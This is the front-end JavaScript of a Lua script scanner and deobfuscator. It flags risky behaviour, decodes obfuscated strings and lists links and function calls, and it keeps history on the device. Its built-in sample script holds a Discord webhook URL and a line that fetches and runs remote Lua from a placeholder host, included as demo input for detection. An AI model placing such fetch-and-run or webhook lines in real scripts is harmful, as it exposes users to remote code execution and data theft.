(function () {
  'use strict';
  var L = window.LuaScriptFucker, $ = function (id) { return document.getElementById(id); };
  var src = '', fname = '';
  var VIEWS = {
    scan: ['Script scanner', 'Check a script for risky behavior before you run it.'],
    clean: ['Cleanup', 'Turn an unreadable script into something you can read.'],
    inspect: ['Inspect', 'List every link, text string and function call in a script.'],
    api: ['Use in code', 'Call the same tools from your own JavaScript.'],
    hist: ['History', 'Scripts you recently scanned or cleaned.']
  };
  var NEEDS_INPUT = { scan: 1, clean: 1, inspect: 1 };
  var SAMPLE = 'local a=string.char(112,114,105,110,116);local b="\\72\\101\\108\\108\\111".." ".."\\87\\111\\114\\108\\100";local n=0x2A;local hook="https://discord.com/api/webhooks/123/abc";for i=1,3 do if i==2 then local f=function()return n end else warn("\\x74\\x69\\x63\\x6B") end end loadstring(game:HttpGet("https://example.com/run.lua"))() print(b,n)';

  function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }
  function store(k, v) { try { if (v === undefined) return JSON.parse(localStorage.getItem(k)); localStorage.setItem(k, JSON.stringify(v)); } catch (e) { return null; } }
  function msg(t) { $('msg').textContent = t || ''; }
  function need() { if (!src.trim()) { msg('Add a script first: drop a file or paste code above.'); return false; } msg(''); return true; }
  function setSrc(text, name) {
    src = text; fname = name || ''; $('inp').value = text;
    $('count').textContent = text ? text.split('\n').length + ' lines' : '';
    $('dropTxt').textContent = name ? 'Loaded ' + name + '. Drop another file to replace it.' : 'Drop a .lua or .luau file here, or click to browse';
  }

  function bump(k) { var s = store('lsf_stats') || { scans: 0, risky: 0, cleans: 0 }; s[k]++; store('lsf_stats', s); }
  function addHist(kind, summary) {
    var list = store('lsf_hist') || [];
    var item = { t: Date.now(), kind: kind, name: fname || 'Pasted script', summary: summary, src: src.slice(0, 30000) };
    list.unshift(item); list = list.slice(0, 20);
    if (store('lsf_hist', list) === null && !store('lsf_hist')) store('lsf_hist', list.slice(0, 5));
  }

  var view = 'scan';
  function show(v) {
    view = v;
    document.querySelectorAll('.side button').forEach(function (b) { b.classList.toggle('on', b.dataset.v === v); });
    document.querySelectorAll('.view').forEach(function (s) { s.hidden = s.id !== 'v-' + v; });
    $('inputCard').hidden = !NEEDS_INPUT[v];
    $('title').textContent = VIEWS[v][0]; $('sub').textContent = VIEWS[v][1];
    msg('');
    if (v === 'scan') stats(); if (v === 'hist') hist();
  }

  function stats() {
    var s = store('lsf_stats') || { scans: 0, risky: 0, cleans: 0 };
    $('statCards').innerHTML = [['Scripts scanned', s.scans], ['Flagged as risky', s.risky], ['Cleanups done', s.cleans]]
      .map(function (c) { return '<div class="stat"><b>' + c[1] + '</b><span>' + c[0] + '</span></div>'; }).join('') +
      '<p class="muted full">Counted on this device only.</p>';
  }

  function scan() {
    if (!need()) return;
    var r = L.scan(src), n = r.findings.length;
    var v = { high: ['bad', 'Looks risky', 'Found serious warning signs. Do not run this script unless you fully trust where it came from.'],
              medium: ['warn', 'Be careful', 'Found things worth checking before you run this script.'],
              none: ['ok', 'Nothing alarming found', 'This only checks the text. It does not run the script, so it can’t prove a script is safe.'] }[r.level];
    var html = '<div class="verdict ' + v[0] + '"><h2>' + v[1] + '</h2><p>' + v[2] + '</p></div>';
    if (n) html += '<h3>What was found</h3>' + r.findings.map(function (f) {
      return '<article class="find l' + f.level + '"><div class="fh"><b>' + esc(f.title) + '</b><span class="muted">' + (f.count > 1 ? f.count + ' times, ' : '') + 'first on line ' + f.line + '</span></div><p>' + esc(f.why) + '</p>' +
        (f.snippet ? '<code>' + esc(f.snippet) + '</code>' : '') + '</article>';
    }).join('');
    if (r.urls.length) html += '<h3>Links in this script</h3><ul class="plain">' + r.urls.map(function (u) { return '<li><code>' + esc(u.text) + '</code></li>'; }).join('') + '</ul>';
    $('scanOut').innerHTML = html;
    bump('scans'); if (r.level === 'high') bump('risky'); stats();
    addHist('Scan', v[1] + (n ? ', ' + n + ' finding' + (n > 1 ? 's' : '') : ''));
  }

  function opts() { return { chr: $('oChar').checked, esc: $('oEsc').checked, cat: $('oCat').checked, hex: $('oHex').checked, fmt: $('oFmt').checked }; }
  function clean(log) {
    if (!need()) return;
    var r = L.cleanup(src, opts()), st = r.stats, p = [];
    $('out').value = r.code;
    if (st.chr) p.push(st.chr + ' string.char folded'); if (st.esc) p.push(st.esc + ' escapes decoded');
    if (st.cat) p.push(st.cat + ' strings joined'); if (st.hex) p.push(st.hex + ' hex numbers converted');
    $('cleanStats').textContent = p.length ? p.join(', ') + '.' : 'Nothing to simplify with the selected steps.';
    if (log) { bump('cleans'); addHist('Cleanup', p.length ? p.join(', ') : 'No changes'); }
  }

  function list(title, items, cap) {
    if (!items.length) return '<h3>' + title + '</h3><p class="muted">None found.</p>';
    return '<h3>' + title + ' (' + items.length + ')</h3><ul class="plain">' + items.slice(0, cap).map(function (i) {
      return '<li><code>' + esc(i.text.length > 140 ? i.text.slice(0, 140) + '…' : i.text) + '</code>' + (i.count > 1 ? '<span class="muted"> ×' + i.count + '</span>' : '') + '</li>';
    }).join('') + '</ul>' + (items.length > cap ? '<p class="muted">Showing the first ' + cap + '.</p>' : '');
  }
  function inspect() {
    if (!need()) return;
    var r = L.inspect(src);
    $('inspectOut').innerHTML = list('Links', r.urls, 100) + list('Text strings', r.strings, 150) + list('Function calls', r.calls, 100);
    addHist('Inspect', r.strings.length + ' strings, ' + r.urls.length + ' links');
  }

  function hist() {
    var h = store('lsf_hist') || [];
    $('histOut').innerHTML = h.length ? h.map(function (e, i) {
      return '<div class="hrow"><span class="tag">' + e.kind + '</span><div class="grow"><b>' + esc(e.name) + '</b><div class="muted">' + esc(e.summary) + ' · ' + new Date(e.t).toLocaleString() + '</div></div><button class="ghost" data-i="' + i + '">Open</button></div>';
    }).join('') : '<p class="empty">Nothing here yet. Scan or clean a script and it shows up here.</p>';
  }

  document.querySelectorAll('.side button').forEach(function (b) { b.addEventListener('click', function () { show(b.dataset.v); }); });
  document.querySelectorAll('.seg button').forEach(function (b) {
    b.addEventListener('click', function () {
      document.querySelectorAll('.seg button').forEach(function (x) { x.classList.toggle('on', x === b); });
      $('tUp').hidden = b.dataset.t !== 'up'; $('inp').hidden = b.dataset.t === 'up';
      if (b.dataset.t === 'paste') $('inp').focus();
    });
  });
  $('inp').addEventListener('input', function () { setSrc($('inp').value, ''); });
  $('bSample').addEventListener('click', function () { setSrc(SAMPLE, 'example'); msg('Example loaded. Pick a tool on the left, then press its button.'); });
  $('bClear').addEventListener('click', function () { setSrc('', ''); $('out').value = ''; $('scanOut').innerHTML = ''; $('inspectOut').innerHTML = ''; $('cleanStats').textContent = ''; msg(''); });

  function readFile(f) {
    if (!f) return; var r = new FileReader();
    r.onload = function () { setSrc(String(r.result), f.name); msg(''); }; r.readAsText(f);
  }
  var dz = $('tUp');
  dz.addEventListener('click', function () { $('file').click(); });
  dz.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); $('file').click(); } });
  $('file').addEventListener('change', function (e) { readFile(e.target.files[0]); });
  ['dragenter', 'dragover'].forEach(function (ev) { dz.addEventListener(ev, function (e) { e.preventDefault(); dz.classList.add('drag'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { dz.addEventListener(ev, function (e) { e.preventDefault(); dz.classList.remove('drag'); }); });
  dz.addEventListener('drop', function (e) { readFile(e.dataTransfer.files[0]); });

  $('bScan').addEventListener('click', scan);
  $('bClean').addEventListener('click', function () { clean(true); });
  $('bInspect').addEventListener('click', inspect);
  ['oChar', 'oEsc', 'oCat', 'oHex', 'oFmt'].forEach(function (id) { $(id).addEventListener('change', function () { if ($('out').value) clean(false); }); });
  $('bUse').addEventListener('click', function () { if ($('out').value) { setSrc($('out').value, fname); msg('The cleaned script is now your input.'); } });
  $('bCopy').addEventListener('click', function () {
    var b = $('bCopy'), done = function () { b.textContent = 'Copied'; setTimeout(function () { b.textContent = 'Copy'; }, 1200); };
    if (navigator.clipboard) navigator.clipboard.writeText($('out').value).then(done); else { $('out').select(); document.execCommand('copy'); done(); }
  });
  $('bSave').addEventListener('click', function () {
    var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([$('out').value], { type: 'text/plain' }));
    a.download = 'cleaned.lua'; document.body.appendChild(a); a.click(); a.remove();
  });
  $('histOut').addEventListener('click', function (e) {
    var b = e.target.closest('button[data-i]'); if (!b) return;
    var h = (store('lsf_hist') || [])[+b.dataset.i]; if (!h) return;
    setSrc(h.src, h.name); show(h.kind === 'Cleanup' ? 'clean' : h.kind === 'Inspect' ? 'inspect' : 'scan');
  });
  $('bWipe').addEventListener('click', function () { store('lsf_hist', []); hist(); });

  show('scan');
})();
